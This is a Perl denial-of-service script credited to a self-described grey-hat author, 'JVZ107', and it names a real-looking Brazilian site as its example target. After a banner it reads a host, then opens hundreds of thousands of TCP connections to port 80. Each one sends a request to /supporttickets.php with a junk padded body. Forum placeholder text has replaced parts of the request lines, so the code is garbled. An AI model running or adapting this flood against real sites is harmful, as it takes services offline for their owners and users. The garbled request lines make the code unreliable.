#!/usr/bin/perl
# derruba.pl jvz107
# jvz107 - jvz107-
#################################
#
# @@@ @@@@@@@@@@@ @@@@@ @@@@@@@@@@ @@@ @@@@@@@
# @@@ @@@@@@@@@@@ @@@ @@ @@@ @@ @@@ @@@@@@@@
# @@@ @@@ @@@ @@ @@@ @@ @@@ @@@ @@@
# @@@ @@@ @@@ @@ @@@ @@ @@@ @@@ @@@
# @@@ @@@@@@@@@@@ @@@ @ @@@@@@@@@@ @@@ @@@@@@
# @@@ @@@@@@@@@@@ @@@ @@ @@@ @@ @@@ @@@@@@
# @@@ @@@ @@@ @@ @@@ @@ @@@ @@@ @@@ @@@
# @@@ @@@ @@@ @@ @@@ @@ @@@ @@@ @@@ @@@
# @@@ @@@@@@@@@@@ @@@@@ @@@@@@@@@@ @@@ @@@ @@@ @@@
#
#####################################
 
use IO::Socket;
print "###########################################################\n";
print "# #\n";
print "# Criado por JVZ107 #\n";
print "# Exploit Database #\n";
print "# exemplo: pmdb.org.br #\n";
print "# https://twitter.com/JVZI07 #\n";
print "# gRaY-HaT";
print "# #\n";
print "###########################################################\n";
print "exemplo = pmdb.org.br : ";
$HOST = <STDIN>;
chop ($HOST);
 
$i=0;
while($i<500000){
$i++;
 
$lower=1;
$upper=200000;
$random = int(rand( $upper-$lower+1 ) ) + $lower;
$FILE = "searchterm=%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0% 0%0%0%0%0%0";
$LENGTH = length $FILE;
 
$get1 = IO::Socket::INET->new( Proto => "tcp", PeerAddr => "$HOST", PeerPort => "80") || die "+";
print $get1 "GET /supporttickets.php [Only registered and activated users can see links]";
print $get1 "Host: ".$HOST. "\n";
print $get1 "Content-Type: application/x-[Only registered and activated users can see links]";
print $get1 "Content-Length: ".$LENGTH."\n\n";
print $get1 $FILE;
syswrite STDOUT, "+";
}
#jvz1
